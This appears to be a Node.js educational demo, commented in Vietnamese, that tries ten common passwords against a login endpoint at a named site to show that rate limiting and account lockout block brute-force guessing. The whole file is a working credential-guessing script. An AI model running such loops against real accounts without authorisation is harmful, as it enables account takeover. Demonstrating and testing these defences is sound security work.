/**
 * DEMO: Brute Force Attack on Login
 * Tấn công vét cạn mật khẩu - Demonstration for Educational Purpose
 * 
 * Mục đích: Minh họa cách attacker thử nhiều password liên tiếp
 * Phòng chống: Rate limiting + Account lockout
 */

const axios = require('axios');

// Cấu hình
const BASE_URL = 'http://tmd1907.id.vn';
const TARGET_USERNAME = 'testuser'; // Thay đổi thành username thực tế
const ATTACK_PASSWORDS = [
  'password123',
  'admin123',
  'test123',
  'password1',
  'password2',
  'password3',
  'password4',
  'password5',
  'qwerty123',
  'letmein'
];

console.log('🔴 DEMO: Brute Force Attack');
console.log('================================');
console.log(`Target URL: ${BASE_URL}`);
console.log(`Target Username: ${TARGET_USERNAME}`);
console.log(`Number of attempts: ${ATTACK_PASSWORDS.length}`);
console.log('================================\n');

/**
 * Hàm thực hiện tấn công brute force
 */
async function bruteForceAttack() {
  let successCount = 0;
  let failureCount = 0;
  let blockedCount = 0;
  
  for (let attempt = 1; attempt <= ATTACK_PASSWORDS.length; attempt++) {
    const password = ATTACK_PASSWORDS[attempt - 1];
    
    try {
      console.log(`[Attempt ${attempt}/${ATTACK_PASSWORDS.length}] Trying password: "${password}"...`);
      
      const response = await axios.post(`${BASE_URL}/login`, {
        username: TARGET_USERNAME,
        password: password
      }, {
        validateStatus: () => true // Không throw error, return status code
      });

      if (response.status === 200 || response.status === 302) {
        console.log(`✅ SUCCESS! Password found: "${password}"`);
        console.log(`   Status: ${response.status}`);
        successCount++;
        break; // Tấn công thành công, dừng
      } else if (response.status === 429) {
        console.log(`❌ BLOCKED! Rate limit triggered!`);
        console.log(`   Status: ${response.status}`);
        console.log(`   Message: ${response.data?.message || 'Too many requests'}`);
        blockedCount++;
        break; // Bị rate limit, dừng
      } else if (response.status === 403) {
        console.log(`⚠️  BLOCKED! Forbidden (CSRF/Account Locked)`);
        console.log(`   Status: ${response.status}`);
        console.log(`   Message: ${response.data?.message || 'Forbidden'}`);
        blockedCount++;
        break; // Bị khóa, dừng
      } else if (response.status === 400 || response.status === 401) {
        console.log(`❌ FAILED! Wrong password`);
        console.log(`   Status: ${response.status}`);
        console.log(`   Message: ${response.data?.error || 'Invalid credentials'}`);
        failureCount++;
      } else {
        console.log(`⚠️  Unexpected response: ${response.status}`);
        console.log(`   Data: ${JSON.stringify(response.data).substring(0, 100)}`);
      }
      
      // Delay 1 giây giữa các attempt để không quá nhanh
      await sleep(1000);
      
    } catch (error) {
      console.log(`❌ ERROR: ${error.message}`);
      failureCount++;
    }
    
    console.log('');
  }

  // Kết quả tấn công
  console.log('\n================================');
  console.log('📊 ATTACK SUMMARY');
  console.log('================================');
  console.log(`✅ Success:  ${successCount}`);
  console.log(`❌ Failed:   ${failureCount}`);
  console.log(`🛡️  Blocked:  ${blockedCount}`);
  console.log('================================\n');

  if (successCount > 0) {
    console.log('🔴 ATTACK SUCCESSFUL! Password was cracked!');
  } else if (blockedCount > 0) {
    console.log('🟢 ATTACK BLOCKED! Security measures worked!');
    console.log('   - Rate limiting prevented brute force');
    console.log('   - Account was protected');
  } else {
    console.log('🟡 ATTACK FAILED! All passwords were incorrect.');
  }
}

/**
 * Sleep function
 */
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Main execution
 */
(async () => {
  try {
    await bruteForceAttack();
  } catch (error) {
    console.error('Fatal error:', error.message);
  }
})();
